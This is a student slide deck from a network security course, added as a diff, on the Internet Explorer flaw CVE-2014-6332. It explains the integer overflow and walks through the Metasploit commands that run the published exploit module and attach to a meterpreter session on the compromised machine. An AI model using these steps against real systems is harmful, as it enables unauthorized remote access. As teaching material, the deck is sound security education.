@@ -1,0 +1,96 @@
+---
+layout: slides
+title: Metasploit &amp; CVE-2014-6332
+---
+
+# Metasploit &amp;
+# CVE-2014-6332
+
+Andreas Persson and Lukas Landenstad
+
+ET1490 Network security 2
+
+---
+
+# About the vulnerability
+
+Called CVE-2014-6332
+
+* Discovered 2014, affects Internet Explorer 3.0 to 11
+
+* Can be exploited to run arbitary code through HTML
+ - Code is executed with shell privilegies
+
+* Integer overflow during array allocation
+
+ - creates an array with wide limits, but small space allocated
+
+ - memory can be accessed outside the array!
+
+* Mitigated by updating Windows or IE
+ - No patch is released for Windows XP
+
+---
+
+# Exploiting the vulnerability
+
+A proof of concept exploitation tool for Metasploit has been published.
+
+The tool works in 3 steps:
+
+1. Create and resize an array to trigger the overflow exploit
+ - Allows full memory access
+
+2. Overwrite the memory flags that limit the script's privilegies
+ - Allows the script to run in "God mode"
+ - The script now has shell privilegies
+
+3.  Execute the payload
+ - Call back to Metasploit, starting a meterpreter session
+---
+
+# Using the exploit
+
+* Start metasploit
+
+```bash
+msfconsole
+```
+
+* Load the exploitation module
+
+```bash
+use exploit/windows/browser/ms14_064_ole_code_execution
+```
+
+- Additional options can be displayed using
+
+```bash
+show options
+```
+
+* Run the exploit
+
+```bash
+exploit
+```
+
+This creates a numbered meterpreter session.
+
+---
+
+# Post exploitation
+
+* Attach to the meterpreter session
+
+```bash
+sessions -i <sessionnumber>
+```
+
+* You now have access to the exploited system
+
+* Valid commands and scripts can be displayed using
+
+```bash
+help
+```
